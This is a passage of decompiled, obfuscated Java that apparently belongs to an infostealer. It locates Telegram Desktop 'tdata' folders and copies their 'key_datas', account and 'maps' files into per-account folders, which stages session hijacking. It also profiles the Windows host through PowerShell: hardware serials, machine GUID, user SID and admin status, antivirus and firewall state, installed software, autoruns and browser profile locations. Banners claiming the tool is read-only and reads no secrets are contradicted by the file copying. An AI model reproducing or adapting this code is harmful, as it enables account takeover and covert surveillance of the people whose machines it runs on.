      }

      ArrayList var9 = new java.util.ArrayList(var1);
      java.util.Collections.sort(var9, java.util.Comparator.comparing(Path::toString));
      return var9;
   }

   private static List<Path> patio(Path var0, int var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 != null
         && java.nio.file.Files.isDirectory(var0, new LinkOption[0])) {
         HashSet var2 = new java.util.HashSet();

         try {
            Stream var3 = java.nio.file.Files.walk(var0, var1, new FileVisitOption[0]);

            try {
               java.util.Objects.requireNonNull(var3);
               Iterator var4 = var3::iterator.iterator();

               while (var4.hasNext()) {
                  Path var5 = (Path)var4.next();
                  if (java.nio.file.Files.isDirectory(var5, new LinkOption[0])
                     && var5.getFileName()
                        != null
                     && "tdata".equalsIgnoreCase(var5.getFileName().toString())
                     && java.nio.file.Files.isRegularFile(var5.resolve("key_datas"), new LinkOption[0])) {
                     var2.add(var5.toAbsolutePath().normalize());
                  }
               }
            } catch (Throwable var7) {
               if (var3 != null) {
                  try {
                     var3.close();
                  } catch (Throwable var6) {
                     var7.addSuppressed(var6);
                  }
               }

               throw var7;
            }

            if (var3 != null) {
               var3.close();
            }
         } catch (Exception var8) {
         }

         ArrayList var9 = new java.util.ArrayList(var2);
         java.util.Collections.sort(var9, java.util.Comparator.comparing(Path::toString));
         return var9;
      } else {
         return java.util.Collections.emptyList();
      }
   }

   private static List<Path> keyhole(Path var0, boolean var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 != null
         && java.nio.file.Files.isDirectory(var0, new LinkOption[0])) {
         HashSet var2 = new java.util.HashSet();
         Path var3 = var0.resolve("tdata").toAbsolutePath().normalize();
         if (java.nio.file.Files.isDirectory(var3, new LinkOption[0])) {
            var2.add(var3);
         }

         if (var1) {
            try {
               DirectoryStream var4 = java.nio.file.Files.newDirectoryStream(var0);

               try {
                  Iterator var5 = var4.iterator();

                  while (var5.hasNext()) {
                     Path var6 = (Path)var5.next();
                     if (java.nio.file.Files.isDirectory(var6, new LinkOption[0])) {
                        String var7 = var6.getFileName().toString().toLowerCase(java.util.Locale.ROOT);
                        if (var7.startsWith("tdata")) {
                           var2.add(var6.toAbsolutePath().normalize());
                        }
                     }
                  }
               } catch (Throwable var13) {
                  if (var4 != null) {
                     try {
                        var4.close();
                     } catch (Throwable var10) {
                        var13.addSuppressed(var10);
                     }
                  }

                  throw var13;
               }

               if (var4 != null) {
                  var4.close();
               }
            } catch (IOException var14) {
            }

            Path var15 = var0.resolve("_split_stage");
            if (java.nio.file.Files.isDirectory(var15, new LinkOption[0])) {
               try {
                  DirectoryStream var17 = java.nio.file.Files.newDirectoryStream(var15);

                  try {
                     Iterator var18 = var17.iterator();

                     while (var18.hasNext()) {
                        Path var19 = (Path)var18.next();
                        Path var8 = var19.resolve("tdata");
                        if (java.nio.file.Files.isDirectory(var8, new LinkOption[0])) {
                           var2.add(var8.toAbsolutePath().normalize());
                        }
                     }
                  } catch (Throwable var11) {
                     if (var17 != null) {
                        try {
                           var17.close();
                        } catch (Throwable var9) {
                           var11.addSuppressed(var9);
                        }
                     }

                     throw var11;
                  }

                  if (var17 != null) {
                     var17.close();
                  }
               } catch (IOException var12) {
               }
            }
         }

         ArrayList var16 = new java.util.ArrayList(var2);
         java.util.Collections.sort(var16, java.util.Comparator.comparing(Path::toString));
         return var16;
      } else {
         return java.util.Collections.emptyList();
      }
   }

   private static List<String> circle(Path var0, int var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Path var2 = var0.resolve("key_datas");
      if (!java.nio.file.Files.isRegularFile(var2, new LinkOption[0])) {
         return java.util.Collections.emptyList();
      }

      HashSet var3 = new java.util.HashSet();

      try {
         DirectoryStream var4 = java.nio.file.Files.newDirectoryStream(var0);

         try {
            Iterator var5 = var4.iterator();

            while (var5.hasNext()) {
               Path var6 = (Path)var5.next();
               if (java.nio.file.Files.isRegularFile(var6, new LinkOption[0])) {
                  String var7 = var6.getFileName().toString();
                  if (var7.endsWith("s")) {
                     String var8 = var7.substring(0, var7.length() - 1);
                     if (ocean.matcher(var8).matches()) {
                        Path var9 = var0.resolve(var8);
                        Path var10 = var9.resolve("maps");
                        if (java.nio.file.Files.isRegularFile(var10, new LinkOption[0])) {
                           int var11 = 0;
                           if (java.nio.file.Files.isDirectory(var9, new LinkOption[0])) {
                              Stream var12 = java.nio.file.Files.list(var9);

                              try {
                                 var11 = (int)var12.filter(var0x -> {
                                          if (rkjsezrwcf.jzdety() != 0) {
                                             rkjsezrwcf.bbsnvj();
                                          }

                                          return java.nio.file.Files.isRegularFile(var0x, new LinkOption[0]);
                                       }).count();
                              } catch (Throwable var17) {
                                 if (var12 != null) {
                                    try {
                                       var12.close();
                                    } catch (Throwable var16) {
                                       var17.addSuppressed(var16);
                                    }
                                 }

                                 throw var17;
                              }

                              if (var12 != null) {
                                 var12.close();
                              }
                           }

                           if (var11 >= var1) {
                              var3.add(var8);
                           }
                        }
                     }
                  }
               }
            }
         } catch (Throwable var18) {
            if (var4 != null) {
               try {
                  var4.close();
               } catch (Throwable var15) {
                  var18.addSuppressed(var15);
               }
            }

            throw var18;
         }

         if (var4 != null) {
            var4.close();
         }
      } catch (IOException var19) {
         return java.util.Collections.emptyList();
      }

      ArrayList var20 = new java.util.ArrayList(var3);
      java.util.Collections.sort(var20);
      return var20;
   }

   private static Path meridian(Path var0, String var1, Path var2, String var3) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Path var4 = var0.resolve("key_datas");
      Path var5 = var0.resolve(new StringBuilder().append(var1).append("s").toString());
      Path var6 = var0.resolve(var1).resolve("maps");
      if (java.nio.file.Files.isRegularFile(var4, new LinkOption[0])
         && java.nio.file.Files.isRegularFile(var5, new LinkOption[0])
         && java.nio.file.Files.isRegularFile(var6, new LinkOption[0])) {
         String var7 = new StringBuilder().append(var3).append("_").append(var1).append("_mini").toString();
         Path var8 = steed(var2, var7);
         int var9 = 0;

         try {
            Path var10 = var8.resolve("tdata");
            Path var11 = var10.resolve(var1);
            java.nio.file.Files.createDirectories(var11, new FileAttribute[0]);
            java.nio.file.Files.copy(var4, var10.resolve("key_datas"), new CopyOption[]{
                  java.nio.file.StandardCopyOption.REPLACE_EXISTING
               });
            java.nio.file.Files.copy(var5, var10.resolve(new StringBuilder().append(var1).append("s").toString()), new CopyOption[]{
                  java.nio.file.StandardCopyOption.REPLACE_EXISTING
               });
            var9++;
            java.nio.file.Files.copy(var6, var11.resolve("maps"), new CopyOption[]{
                  java.nio.file.StandardCopyOption.REPLACE_EXISTING
               });
            var9++;
            if (++var9 == 0) {
               raincoat(var8);
               return null;
            } else {
               return var8;
            }
         } catch (IOException var12) {
            raincoat(var8);
            throw var12;
         }
      } else {
         throw new java.io.IOException(new StringBuilder().append("Missing required files for account ").append(var1).append(" in ").append(var0).toString());
      }
   }

   private static Path steed(Path var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Path var2 = var0.resolve(var1);
      if (!java.nio.file.Files.exists(var2, new LinkOption[0])) {
         return var2;
      }

      int var3 = 2;

      while (true) {
         Path var4 = var0.resolve(new StringBuilder().append(var1).append("_").append(var3).toString());
         if (!java.nio.file.Files.exists(var4, new LinkOption[0])) {
            return var4;
         }

         var3++;
      }
   }

   private static String feather(Path var0, Path var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Path var2 = var0.toAbsolutePath().normalize();
      Path var3 = var1.toAbsolutePath().normalize();

      String var4;
      try {
         if (var3.startsWith(var2)) {
            Path var5 = var2.relativize(var3);
            StringBuilder var6 = new StringBuilder();
            Iterator var7 = var5.iterator();

            while (var7.hasNext()) {
               Path var8 = (Path)var7.next();
               if (var6.length() > 0) {
                  var6.append('_');
               }

               var6.append(var8.toString());
            }

            var4 = var6.toString();
         } else {
            var4 = var3.getFileName()
                  == null
               ? "tdata"
               : var3.getFileName().toString();
         }
      } catch (Exception var9) {
         var4 = var3.getFileName()
               == null
            ? "tdata"
            : var3.getFileName().toString();
      }

      return oasis(var4);
   }

   private static String oasis(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (srlewa(var0)) {
         return "root";
      }

      String var1 = var0.replace(' ', '_').replaceAll("[^A-Za-z0-9._-]", "_");
      var1 = var1.replaceAll("_+", "_");
      if (var1.startsWith("_")) {
         var1 = var1.substring(1);
      }

      if (var1.endsWith("_")) {
         var1 = var1.substring(0, var1.length() - 1);
      }

      return var1.isEmpty()
         ? "root"
         : var1;
   }

   private static void raincoat(Path var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 != null
         && java.nio.file.Files.exists(var0, new LinkOption[0])) {
         try {
            Stream var1 = java.nio.file.Files.walk(var0, new FileVisitOption[0]);

            try {
               List var2 = (List)var1.sorted(java.util.Comparator.reverseOrder()).collect(java.util.stream.Collectors.toList());
               Iterator var3 = var2.iterator();

               while (var3.hasNext()) {
                  Path var4 = (Path)var3.next();

                  try {
                     java.nio.file.Files.deleteIfExists(var4);
                  } catch (IOException var7) {
                  }
               }
            } catch (Throwable var8) {
               if (var1 != null) {
                  try {
                     var1.close();
                  } catch (Throwable var6) {
                     var8.addSuppressed(var6);
                  }
               }

               throw var8;
            }

            if (var1 != null) {
               var1.close();
            }
         } catch (IOException var9) {
         }
      }
   }

   private static String pepper(String var0, Path var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var2 = oasis(var0);
      String var3 = var1 == null
         ? "root"
         : var1.toAbsolutePath().normalize().toString().toLowerCase(java.util.Locale.ROOT);
      String var4 = Integer.toHexString(var3.hashCode());
      if (var4.startsWith("-")) {
         var4 = new StringBuilder().append("n").append(var4.substring(1)).toString();
      }

      return new StringBuilder().append(var2).append("_").append(var4).toString();
   }

   public void atlas() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         if (!fennel) {
            return;
         }

         if (colony) {
            this.wrvcdg();
         }

         if (scorpion) {
            this.kkcmcc();
         }

         if (scorpion) {
            zwcnnh();
         }

         if (buffer) {
            this.hcoqdr();
         }

         if (buffer) {
            this.fffzbk();
         }

         if (memoir) {
            this.rquunu();
         }

         if (memoir) {
            rxbcwq();
         }

         if (buffer) {
            llllpt();
         }

         if (ivory) {
            this.nqnefh();
         }

         if (bridge) {
            this.xbapjz();
         }

         if (piano) {
            this.mdzfhk();
         }

         if (sorghum) {
            this.rrqvhs();
         }

         this.qmeuvi();
      } catch (Exception var2) {
         var2.printStackTrace();
      }
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void nyyzth() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         raft = new File(new StringBuilder().append(lantern).append("\\SystemInfo.txt").toString());
         boolean var5 = false /* VF: Semaphore variable */;

         label70: {
            try {
               var5 = true;
               mosaic = new java.io.PrintWriter(new java.io.OutputStreamWriter(new java.io.FileOutputStream(raft), java.nio.charset.StandardCharsets.UTF_8), true);
               jelly();
               mosaic.flush();
               System.out.println(new StringBuilder().append("Inventory saved to: ").append(raft.getAbsolutePath()).toString());
               var5 = false;
               break label70;
            } catch (IOException var6) {
               System.err.println(new StringBuilder().append("Failed to create report file: ").append(xpiccr(var6)).toString());
               var5 = false;
            } finally {
               if (var5) {
                  if (mosaic != null) {
                     mosaic.close();
                  }
               }
            }

            if (mosaic != null) {
               mosaic.close();
            }

            return;
         }

         if (mosaic != null) {
            mosaic.close();
         }
      } catch (Exception var8) {
         var8.printStackTrace();
      }
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   private static void jelly() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ExecutorService var0 = java.util.concurrent.Executors.newFixedThreadPool(4);
      ArrayList var1 = new java.util.ArrayList();
      boolean var9 = false /* VF: Semaphore variable */;

      try {
         var9 = true;
         var1.add(var0.submit(ivxnxl(prawn::nomad)));
         var1.add(var0.submit(ivxnxl(prawn::collar)));
         var1.add(var0.submit(ivxnxl(prawn::apvniy)));
         var1.add(var0.submit(ivxnxl(prawn::lilac)));
         var1.add(var0.submit(ivxnxl(prawn::kqdhrq)));
         var1.add(var0.submit(ivxnxl(prawn::oallgl)));
         var1.add(var0.submit(ivxnxl(prawn::mammoth)));
         var1.add(var0.submit(ivxnxl(prawn::easizt)));
         var1.add(var0.submit(ivxnxl(prawn::stallion)));
         var1.add(var0.submit(ivxnxl(prawn::sikrlb)));
         var1.add(var0.submit(ivxnxl(prawn::jweydw)));
         var1.add(var0.submit(ivxnxl(prawn::khlmze)));
         var1.add(var0.submit(ivxnxl(prawn::fhxwjy)));
         var1.add(var0.submit(ivxnxl(prawn::siygrt)));
         var1.add(var0.submit(ivxnxl(prawn::gjejsh)));
         var0.shutdown();
         Iterator var2 = var1.iterator();

         while (var2.hasNext()) {
            Future var3 = (Future)var2.next();

            try {
               mosaic.print(var3.get(180, java.util.concurrent.TimeUnit.SECONDS));
            } catch (TimeoutException var10) {
               mosaic.println("[section timeout]");
            } catch (Exception var11) {
               mosaic.println(new StringBuilder().append("[section failed] ").append(xpiccr(var11)).toString());
            }
         }

         var9 = false;
      } finally {
         if (var9) {
            var0.shutdownNow();
         }
      }

      var0.shutdownNow();
      cxssab("DONE");
   }

   private static Callable<StringBuilder> ivxnxl(Runnable var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return () -> {
         if (rkjsezrwcf.jzdety() != 0) {
            rkjsezrwcf.bbsnvj();
         }

         StringBuilder var1 = new StringBuilder(4096);
         papaya.set(var1);
         boolean var6 = false /* VF: Semaphore variable */;

         label47: {
            try {
               var6 = true;
               var0.run();
               var6 = false;
               break label47;
            } catch (Throwable var7) {
               var1.append("[section failed] ").append(xpiccr(var7)).append('\n');
               var6 = false;
            } finally {
               if (var6) {
                  papaya.remove();
               }
            }

            papaya.remove();
            return var1;
         }

         papaya.remove();
         return var1;
      };
   }

   private static void nomad() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      kvlfae(
         "=== LOCAL SYSTEM INVENTORY ==="
      );
      kvlfae(
         "Mode: read-only local diagnostics"
      );
      kvlfae("Network: not used");
      kvlfae(
         "Secrets: cookies/passwords/tokens/sessions are not read"
      );
   }

   private static void apvniy() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab("UNIQUE MACHINE IDS");
      kvlfae(
         "Note: these are stable local identifiers. They are printed only to the console."
      );
      drfeeo(
         "MachineGuid / ProductId",
         "$crypto = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -ErrorAction SilentlyContinue; $win = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -ErrorAction SilentlyContinue; 'MachineGuid=' + $crypto.MachineGuid; 'WindowsProductId=' + $win.ProductId",
         20
      );
      drfeeo(
         "User SID",
         "$identity = [Security.Principal.WindowsIdentity]::GetCurrent(); 'User=' + $identity.Name; 'UserSID=' + $identity.User.Value",
         20
      );
      drfeeo(
         "Hardware UUID",
         "Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue | Select-Object Vendor,Name,IdentifyingNumber,UUID | Format-List",
         20
      );
      drfeeo(
         "BIOS serial",
         "Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue | Select-Object Manufacturer,SMBIOSBIOSVersion,SerialNumber | Format-List",
         20
      );
      drfeeo(
         "Motherboard serial",
         "Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue | Select-Object Manufacturer,Product,SerialNumber,Version | Format-List",
         20
      );
      drfeeo(
         "Disk serials",
         "Get-CimInstance Win32_DiskDrive -ErrorAction SilentlyContinue | Select-Object Model,SerialNumber,InterfaceType,MediaType,Size | Format-Table -AutoSize",
         20
      );
      drfeeo(
         "Volume serials",
         "Get-CimInstance Win32_LogicalDisk -ErrorAction SilentlyContinue | Where-Object { $_.DriveType -eq 3 } | Select-Object DeviceID,VolumeName,VolumeSerialNumber,FileSystem,Size,FreeSpace | Format-Table -AutoSize",
         20
      );
   }

   private static void collar() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab("BASIC");
      kvlfae(
         new StringBuilder().append("Hostname: ").append(ddulqy("COMPUTERNAME")).toString()
      );
      kvlfae(
         new StringBuilder().append("Username: ").append(System.getProperty("user.name", "unknown")).toString()
      );
      kvlfae(
         new StringBuilder().append("User home: ").append(System.getProperty("user.home", "unknown")).toString()
      );
      kvlfae(
         new StringBuilder().append("OS name: ").append(System.getProperty("os.name", "unknown")).toString()
      );
      kvlfae(
         new StringBuilder().append("OS version: ").append(System.getProperty("os.version", "unknown")).toString()
      );
      kvlfae(
         new StringBuilder().append("OS arch: ").append(System.getProperty("os.arch", "unknown")).toString()
      );
      kvlfae(
         new StringBuilder().append("Java version: ").append(System.getProperty("java.version", "unknown")).toString()
      );
      kvlfae(
         new StringBuilder().append("Java vendor: ").append(System.getProperty("java.vendor", "unknown")).toString()
      );
      kvlfae(
         new StringBuilder().append("Java arch: ").append(System.getProperty("sun.arch.data.model", "unknown")).append("-bit").toString()
      );
      Locale var0 = java.util.Locale.getDefault();
      TimeZone var1 = java.util.TimeZone.getDefault();
      kvlfae(
         new StringBuilder().append("Locale: ").append(var0).toString()
      );
      kvlfae(
         new StringBuilder().append("Language: ").append(var0.getLanguage()).toString()
      );
      kvlfae(
         new StringBuilder().append("Timezone: ").append(var1.getID()).toString()
      );
      kvlfae(
         new StringBuilder().append("Current time: ").append(new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss Z").format(new java.util.Date())).toString()
      );
      dutwpp();
      wvdhac();
      drfeeo(
         "Last boot / uptime",
         "$os = Get-CimInstance Win32_OperatingSystem; $boot = $os.LastBootUpTime; $uptime = (Get-Date) - $boot; 'LastBoot=' + $boot; 'Uptime=' + ('{0}d {1}h {2}m' -f $uptime.Days,$uptime.Hours,$uptime.Minutes)",
         20
      );
   }

   private static void dutwpp() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         OperatingSystemMXBean var0 = java.lang.management.ManagementFactory.getOperatingSystemMXBean();
         kvlfae(
            new StringBuilder().append("CPU threads visible: ").append(Runtime.getRuntime().availableProcessors()).toString()
         );
         if (var0 instanceof com.sun.management.OperatingSystemMXBean) {
            com.sun.management.OperatingSystemMXBean var1 = (com.sun.management.OperatingSystemMXBean)var0;
            kvlfae(
               new StringBuilder().append("RAM total: ").append(lmxkho(
                        var1.getTotalPhysicalMemorySize()
                     )).toString()
            );
            kvlfae(
               new StringBuilder().append("RAM free: ").append(lmxkho(
                        var1.getFreePhysicalMemorySize()
                     )).toString()
            );
         } else {
            kvlfae(
               "RAM total/free: unavailable from current JVM"
            );
         }
      } catch (Throwable var2) {
         kvlfae(
            new StringBuilder().append("RAM/CPU: error: ").append(xpiccr(var2)).toString()
         );
      }
   }

   private static void wvdhac() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      File[] var0 = File.listRoots();
      if (var0 != null && var0.length != 0) {
         for (File var4 : var0) {
            kvlfae(
               new StringBuilder().append("Disk ").append(var4.getAbsolutePath()).append(" total=").append(lmxkho(var4.getTotalSpace())).append(" free=").append(lmxkho(var4.getFreeSpace())).append(" usable=").append(lmxkho(var4.getUsableSpace())).toString()
            );
         }
      } else {
         kvlfae("Disks: unavailable");
      }
   }

   private static void lilac() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab("WINDOWS IDENTITY");
      lngylf("Current user", "whoami", 20);
      lngylf("User SID", "whoami /user", 20);
      lngylf(
         "User groups",
         "whoami /groups",
         20
      );
      drfeeo(
         "Admin / elevated / UAC",
         "$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()); $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); $groups = whoami /groups; $elevated = ($groups -match 'S-1-16-12288') -or ($groups -match 'High Mandatory Level'); $uac = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -ErrorAction SilentlyContinue; 'IsAdminGroup=' + $isAdmin; 'ElevatedHighIntegrity=' + $elevated; 'UAC_EnableLUA=' + $uac.EnableLUA",
         20
      );
      drfeeo(
         "Domain / workgroup",
         "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,PartOfDomain,Manufacturer,Model | Format-List",
         20
      );
      lngylf(
         "MachineGuid",
         "reg query HKLM\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid",
         20
      );
      lngylf(
         "Windows Product ID",
         "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductId",
         20
      );
   }

   private static void kqdhrq() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab("HARDWARE");
      drfeeo(
         "CPU",
         "Get-CimInstance Win32_Processor | Select-Object Name,Manufacturer,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed | Format-List",
         20
      );
      drfeeo(
         "GPU",
         "Get-CimInstance Win32_VideoController | Select-Object Name,DriverVersion,AdapterRAM,VideoProcessor | Format-List",
         20
      );
      drfeeo(
         "BIOS",
         "Get-CimInstance Win32_BIOS | Select-Object Manufacturer,SMBIOSBIOSVersion,SerialNumber,ReleaseDate | Format-List",
         20
      );
      drfeeo(
         "Motherboard",
         "Get-CimInstance Win32_BaseBoard | Select-Object Manufacturer,Product,SerialNumber,Version | Format-List",
         20
      );
      drfeeo(
         "Computer UUID",
         "Get-CimInstance Win32_ComputerSystemProduct | Select-Object Vendor,Name,IdentifyingNumber,UUID | Format-List",
         20
      );
      drfeeo(
         "Physical disks",
         "Get-CimInstance Win32_DiskDrive | Select-Object Model,SerialNumber,Size,InterfaceType,MediaType | Format-List",
         20
      );
      lngylf("Volume serials", "vol", 20);
      drfeeo(
         "Battery",
         "$b = Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue; if ($b) { $b | Select-Object Name,EstimatedChargeRemaining,BatteryStatus | Format-List } else { 'Battery=not found' }",
         20
      );
   }

   private static void oallgl() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab("SECURITY");
      drfeeo(
         "Antivirus products",
         "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object displayName,productState | Format-Table -AutoSize",
         20
      );
      drfeeo(
         "Windows Defender",
         "if (Get-Command Get-MpComputerStatus -ErrorAction SilentlyContinue) { Get-MpComputerStatus | Select-Object AMServiceEnabled,AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,NISEnabled,AntispywareEnabled,BehaviorMonitorEnabled,DefenderSignaturesOutOfDate,QuickScanAge,FullScanAge | Format-List } else { 'Get-MpComputerStatus=unavailable' }",
         20
      );
      drfeeo(
         "Firewall profiles",
         "if (Get-Command Get-NetFirewallProfile -ErrorAction SilentlyContinue) { Get-NetFirewallProfile | Select-Object Name,Enabled,DefaultInboundAction,DefaultOutboundAction | Format-Table -AutoSize } else { netsh advfirewall show allprofiles }",
         20
      );
      drfeeo(
         "SmartScreen",
         "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer' -ErrorAction SilentlyContinue | Select-Object SmartScreenEnabled | Format-List",
         20
      );
   }

   private static void mammoth() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab("NETWORK CONFIGURATION");
      kvlfae(
         "Note: this reads local settings only and does not contact the internet."
      );
      drfeeo(
         "Proxy settings",
         "Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -ErrorAction SilentlyContinue | Select-Object ProxyEnable,ProxyServer,AutoConfigURL | Format-List",
         20
      );
      drfeeo(
         "DNS servers",
         "if (Get-Command Get-DnsClientServerAddress -ErrorAction SilentlyContinue) { Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object InterfaceAlias,ServerAddresses | Format-Table -AutoSize } else { ipconfig /all }",
         20
      );
      drfeeo(
         "RDP status",
         "$ts = Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -ErrorAction SilentlyContinue; 'RDP_fDenyTSConnections=' + $ts.fDenyTSConnections",
         20
      );
   }

   private static void easizt() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab("INSTALLED PROGRAMS");
      drfeeo(
         "Installed programs from uninstall registry",
         "$paths = @('HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'); Get-ItemProperty $paths -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Sort-Object DisplayName -Unique | Select-Object -First 300 DisplayName,DisplayVersion,Publisher,InstallDate | Format-Table -AutoSize",
         45
      );
   }

   private static void stallion() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab("RUNNING PROCESSES");
      drfeeo(
         "Processes, no command lines",
         "Get-Process -ErrorAction SilentlyContinue | Sort-Object ProcessName | Select-Object -First 300 ProcessName,Id,@{Name='WorkingSetMB';Expression={[math]::Round($_.WorkingSet64/1MB,1)}} | Format-Table -AutoSize",
         20
      );
   }

   private static void sikrlb() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab("STARTUP READ-ONLY");
      kvlfae(
         "Note: autorun locations are listed only; nothing is created or changed."
      );
      drfeeo(
         "Registry Run entries, value names only",
         "$keys = @('HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run','HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run','HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run'); foreach ($key in $keys) { 'Key=' + $key; $item = Get-ItemProperty $key -ErrorAction SilentlyContinue; if ($item) { $item.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' } | Select-Object @{Name='ValueName';Expression={$_.Name}} | Format-Table -AutoSize } else { 'Unavailable or empty' } }",
         20
      );
      drfeeo(
         "Startup folders",
         "$folders = @([Environment]::GetFolderPath('Startup'),[Environment]::GetFolderPath('CommonStartup')); foreach ($f in $folders) { 'Folder=' + $f; if (Test-Path $f) { Get-ChildItem $f -Force -ErrorAction SilentlyContinue | Select-Object Name,Length,LastWriteTime | Format-Table -AutoSize } else { 'Missing' } }",
         20
      );
      drfeeo(
         "WMI startup entries",
         "Get-CimInstance Win32_StartupCommand -ErrorAction SilentlyContinue | Select-Object -First 150 Name,User,Location | Format-Table -AutoSize",
         20
      );
   }

   private static void jweydw() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab(
         "SCHEDULED TASKS READ-ONLY"
      );
      drfeeo(
         "Enabled scheduled tasks",
         "if (Get-Command Get-ScheduledTask -ErrorAction SilentlyContinue) { Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } | Sort-Object TaskPath,TaskName | Select-Object -First 250 TaskName,TaskPath,State | Format-Table -AutoSize } else { schtasks /query /fo table }",
         45
      );
   }

   private static void khlmze() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab("SERVICES SUMMARY");
      drfeeo(
         "Running automatic services",
         "Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.State -eq 'Running' -and $_.StartMode -eq 'Auto' } | Sort-Object Name | Select-Object -First 200 Name,DisplayName,StartMode,State | Format-Table -AutoSize",
         20
      );
   }

   private static void fhxwjy() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab(
         "BROWSERS PRESENCE ONLY"
      );
      kvlfae(
         "This block checks install/profile directory names only. It does not open browser databases or session files."
      );
      cawbyq(
         "Chrome",
         new File(lvftzz("LOCALAPPDATA"), "Google\\Chrome\\User Data"),
         java.util.Arrays.asList(new File[]{
               new File(lvftzz("PROGRAMFILES"), "Google\\Chrome\\Application\\chrome.exe"),
               new File(lvftzz("PROGRAMFILES(X86)"), "Google\\Chrome\\Application\\chrome.exe")
            })
      );
      cawbyq(
         "Edge",
         new File(lvftzz("LOCALAPPDATA"), "Microsoft\\Edge\\User Data"),
         java.util.Arrays.asList(new File[]{
               new File(lvftzz("PROGRAMFILES(X86)"), "Microsoft\\Edge\\Application\\msedge.exe"),
               new File(lvftzz("PROGRAMFILES"), "Microsoft\\Edge\\Application\\msedge.exe")
            })
      );
      cawbyq(
         "Brave",
         new File(lvftzz("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data"),
